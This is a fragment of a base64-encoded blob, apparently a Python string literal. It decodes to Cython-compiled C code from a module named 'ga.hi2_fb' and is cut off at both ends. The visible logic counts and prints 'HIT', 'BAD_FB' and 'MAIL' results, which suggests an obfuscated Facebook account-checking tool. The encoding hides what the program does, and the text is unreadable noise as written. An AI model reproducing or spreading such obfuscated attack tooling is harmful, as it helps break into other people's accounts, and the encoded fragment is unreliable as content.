SghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMTRfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICAgICAgICBfX3B5eF90XzUgPSAxOwogICAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yKSkpIHsKICAgICAgICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpOwogICAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yKTsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICB7CiAgICAgICAgICAgICAg""UHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgTlVMTH07CiAgICAgICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgxLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDE0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9jb3VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDgzLCBfX3B5eF9MMjBfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wyMF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9jb3VudCwgX19weXhfdF8xKSA8IDApIF9f""UFlYX0VSUigwLCA4MywgX19weXhfTDIwX2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgICAgICAgICAgZ290byBfX3B5eF9MMjdfdHJ5X2VuZDsKICAgICAgICAgICAgICAgIF9fcHl4X0wyMF9lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLmhpMl9mYiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEsICZfX3B5eF90XzQsICZfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8xLCBfX3B5eF90XzQsIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMiwgX19weXhfdF82LCBOVUxMKTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDIyX2V4Y2Vw""dF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMSA8IDApIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDIyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNyA9ICghX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE3KSkgewogICAgICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMSwgX19weXhfdF80LCBfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMSA9IDA7ICBfX3B5eF90XzQgPSAwOyAgX19weXhfdF8yID0gMDsgCiAgICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDIxX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19weXhfTDIyX2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEzLCBfX3B5eF90XzE0LCBfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDVfZXJyb3I7CiAgICAgICAgICAgICAgICBfX3B5eF9MMjFfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMywgX19weXhfdF8xNCwgX19weXhfdF8xNSk7""CiAgICAgICAgICAgICAgICBfX3B5eF9MMjdfdHJ5X2VuZDo7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTIpIHsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0sIE5VTEwpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTUpKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxOTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19weXhfTDE5OjsKICAgICAgICAgICAgfQogICAgICAgICAgICBnb3RvIF9fcHl4X0wzMTsKICAgICAgICAgICAgX19weXhfTDE0X2Vycm9yOjsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgZ290byBfX3B5eF9MNV9lcnJvcjsKICAgICAgICAgICAgX19weXhfTDMxOjsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgICAgICBfX3B5eF90XzEgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkX2NvdW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0X2NvdW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVG""KF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzE4ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fcHl4X3RfMTlbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JBRF9GQjsKICAgICAgICAgIF9fcHl4X3RfMTlbMV0gPSBfX3B5eF90XzM7CiAgICAgICAgICBfX3B5eF90XzE5WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9ISVQ7CiAgICAgICAgICBfX3B5eF90XzE5WzNdID0gX19weXhfdF8xODsKICAgICAgICAgIF9fcHl4X3RfMTlbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X01BSUw7CiAgICAgICAgICBfX3B5eF90XzE5WzVdID0gX19weXhfdl9COwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xOSwgNiwgOSAqIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzMpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xOCkgKyAxMCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3ZfQiksIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzMpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTgpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3ZfQikpOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgICBfX3B5eF90XzUgPSAxOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzZ9OwogICAgICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEp""OyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBnb3RvIF9fcHl4X0wxMzsKICAgICAgICB9CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzMl9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7CiAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgICAgICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChf""X3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMzJfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTUsICZfX3B5eF90XzE0LCAmX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0X2NvdW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wzOF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4NywgX19weXhfTDM4X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0X2NvdW50LCBfX3B5eF90XzEpIDwgMCkgX19QWVhfRVJSKDAsIDg3LCBfX3B5eF9MMzhfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAgICAgICAg""ICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w0NV90cnlfZW5kOwogICAgICAgICAgICAgICAgX19weXhfTDM4X2Vycm9yOjsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnYS5oaTJfZmIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xLCAmX19weXhfdF8yLCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTIsIF9fcHl4X3RfNiwgTlVMTCk7CiAgICAgICAgICAgICAgICAgIF9fU